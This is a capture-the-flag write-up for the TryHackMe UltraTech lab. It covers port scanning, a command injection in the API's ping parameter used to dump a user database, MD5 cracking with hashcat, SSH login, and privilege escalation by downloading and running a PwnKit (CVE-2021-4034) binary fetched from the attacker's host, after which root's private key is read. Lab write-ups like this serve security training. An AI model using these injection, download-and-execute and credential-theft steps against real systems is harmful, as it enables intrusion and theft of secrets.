# UltraTech

Link to the room: https://tryhackme.com/room/ultratech1

## Let's start !! 

First, we set an IP variable 

````````
export IP=10.10.8.244
````````

### Rustscan

As always we start with rustscan I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan $IP -- -A -sC -oN nmap.txt
````````

````````
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.8.244:21
Open 10.10.8.244:22
Open 10.10.8.244:8081
Open 10.10.8.244:31331
x^[[B[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -sC -oN nmap.txt -vvv -p 21,22,8081,31331 10.10.8.244

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 14:39 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:39, 0.00s elapsed
Initiating Ping Scan at 14:39
Scanning 10.10.8.244 [4 ports]
Completed Ping Scan at 14:39, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:39
Completed Parallel DNS resolution of 1 host. at 14:39, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:39
Scanning 10.10.8.244 [4 ports]
Discovered open port 22/tcp on 10.10.8.244
Discovered open port 21/tcp on 10.10.8.244
Discovered open port 8081/tcp on 10.10.8.244
Discovered open port 31331/tcp on 10.10.8.244
Completed SYN Stealth Scan at 14:39, 0.25s elapsed (4 total ports)
Initiating Service scan at 14:39
Scanning 4 services on 10.10.8.244
Completed Service scan at 14:39, 11.82s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.8.244
Retrying OS detection (try #2) against 10.10.8.244
Initiating Traceroute at 14:39
Completed Traceroute at 14:39, 0.25s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:39
Completed Parallel DNS resolution of 2 hosts. at 14:39, 0.02s elapsed
DNS resolution of 2 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.8.244.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:39
Completed NSE at 14:40, 9.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:40
Completed NSE at 14:40, 1.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
Nmap scan report for 10.10.8.244
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2022-06-03 14:39:40 IST for 30s

PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
31331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=6/3%OT=21%CT=%CU=37564%PV=Y%DS=2%DC=T%G=N%TM=6299CFF2%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=A)
SEQ(SP=100%GCD=1%ISR=104%TI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 34.847 days (since Fri Apr 29 18:21:00 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   181.57 ms 10.8.0.1
2   248.04 ms 10.10.8.244

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:40
Completed NSE at 14:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.33 seconds
           Raw packets sent: 63 (4.368KB) | Rcvd: 43 (3.172KB)

````````
so we have ports 21,22,8081 and 31331 open. let's enumerate those... 

## Http (8081)

![alt_8081](./image/api_webpage_8081.png)

here we have an API installed called UltraTech API v0.1.3. I have tried directory busting with gobuster nothing interesting came. let us continue our enumeration on other opened ports...

## Http (31331)

![alt_31331](./image/http-31331.png)

Here, we have a web page. I have done some directory busting and found some juicy things...

### Gobuster (http 31331)

````````
gobuster dir -u http://10.10.8.244:31331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x txt,php,zip,html,js,zip | tee gobuster.log
````````

````````
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.8.244:31331/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,js,txt,php,zip
[+] Timeout:                 10s
===============================================================
2022/06/03 14:45:35 Starting gobuster in directory enumeration mode
===============================================================
/partners.html        (Status: 200) [Size: 1986]
/images               (Status: 301) [Size: 320] [--> http://10.10.8.244:31331/images/]
/index.html           (Status: 200) [Size: 6092]                                      
/css                  (Status: 301) [Size: 317] [--> http://10.10.8.244:31331/css/]   
/js                   (Status: 301) [Size: 316] [--> http://10.10.8.244:31331/js/]    
/javascript           (Status: 301) [Size: 324] [--> http://10.10.8.244:31331/javascript/]
/what.html            (Status: 200) [Size: 2534]                                          
/robots.txt           (Status: 200) [Size: 53] 

````````
I have gone through every directory and found an interesting .js file...

![alt_js](./image/js-rce.png)

According to this js file, we have a rce or local file inclusion on UltraTech API v0.1.3. Let's take a look at it...

````````c
http://IP:8081/ping?ip=`{command}`

````````

![alt_success_ls](./image/success-local-file-inclusion.png)

YESS!! So we have a local file inclusion. Here we have a sqlite database file let's concatenate it...

![alt_data_base](./image/utech.db.sqlite-cat.png)

WOW! here we have found two users and their hash. firstly we will identify their types and mode with nth aka name-that-hash. than cracked it.



### nth (Name-That-Hash)


````````
nth -f hash1.txt
````````

````````
  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|
   

{REDACTED}

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

Least Likely
Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  LM, HC: 3000 JtR: lm RIPEMD-128, JtR: ripemd-128 
Haval-128, JtR: haval-128-4 Haval-128 (3 rounds), JtR: dynamic_160 Haval-128 (5 rounds), JtR: dynamic_180 Tiger-128,  
Skein-256(128),  Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 Skype, HC: 23  ZipMonster,  PrestaShop, HC: 11000 
md5(md5(md5($pass))), HC: 3500  md5(uppercase(md5($pass))), HC: 4300  md5(sha1($pass)), HC: 4400  md5($pass.$salt), HC: 10  
md5($salt.$pass), HC: 20  md5(unicode($pass).$salt), HC: 30  md5($salt.unicode($pass)), HC: 40  HMAC-MD5 (key = $pass), HC: 50 
JtR: hmac-md5 HMAC-MD5 (key = $salt), HC: 60 JtR: hmac-md5 md5(md5($salt).$pass), HC: 3610  md5($salt.md5($pass)), HC: 3710  
md5($pass.md5($salt)), HC: 3720  md5($salt.$pass.$salt), HC: 3810  md5(md5($pass).md5($salt)), HC: 3910  
md5($salt.md5($salt.$pass)), HC: 4010  md5($salt.md5($pass.$salt)), HC: 4110  md5($username.0.$pass), HC: 4210  
md5(utf16($pass)), JtR: dynamic_29 md4($salt.$pass), JtR: dynamic_31 md4($pass.$salt), JtR: dynamic_32 md4(utf16($pass)), JtR: 
dynamic_33 md5(md4($pass)), JtR: dynamic_34 net-md5, JtR: dynamic_39 md5($salt.pad16($pass)), JtR: dynamic_39 MD2, JtR: md2 
Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt 
PKZIP Master Key, HC: 20500

````````
okey,we have finded that hash type and its mode so lets crack this with....


### Hashcat 

````````
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
````````

````````
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10870H CPU @ 2.20GHz, 2904/5872 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

{REDACTED}:{REDACTED}                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: {REDACTED}
Time.Started.....: Fri Jun  3 19:58:27 2022, (2 secs)
Time.Estimated...: Fri Jun  3 19:58:29 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4032.7 kH/s (0.15ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5246976/14344385 (36.58%)
Rejected.........: 0/5246976 (0.00%)
Restore.Point....: 5243904/14344385 (36.56%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: n12106 -> mztthew
Hardware.Mon.#1..: Util: 30%

Started: Fri Jun  3 19:57:59 2022
Stopped: Fri Jun  3 19:58:30 2022

````````
YESS!! The hash is cracked. now lets login to our targeted machin as user r00t via ssh..


## Privilage Esculation (root user's private SSH key) 

````````
ssh r00t@$IP
````````

````````
r00t@ultratech-prod:~$ whoami
r00t
r00t@ultratech-prod:~$ wget http://10.8.126.243/PwnKit
--2022-06-03 16:44:14--  http://10.8.126.243/PwnKit
Connecting to 10.8.126.243:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14688 (14K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                            100%[=============================================================>]  14.34K  71.2KB/s    in 0.2s    

2022-06-03 16:44:14 (71.2 KB/s) - ‘PwnKit’ saved [14688/14688]

r00t@ultratech-prod:~$ ls
PwnKit
r00t@ultratech-prod:~$ chmod +x PwnKit 
r00t@ultratech-prod:~$ ./PwnKit 
root@ultratech-prod:/home/r00t# whoami
root
root@ultratech-prod:/home/r00t#
root@ultratech-prod:/home/r00t# cd 
root@ultratech-prod:~# cd .ssh/
root@ultratech-prod:~/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@ultratech-prod:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
{REDACTED}
-----END RSA PRIVATE KEY-----
root@ultratech-prod:~/.ssh# 

````````
Reference: https://github.com/TanmoyG1800/CVE-2021-4034

For getting root here we use CVE-2021-4034.

- DONE 


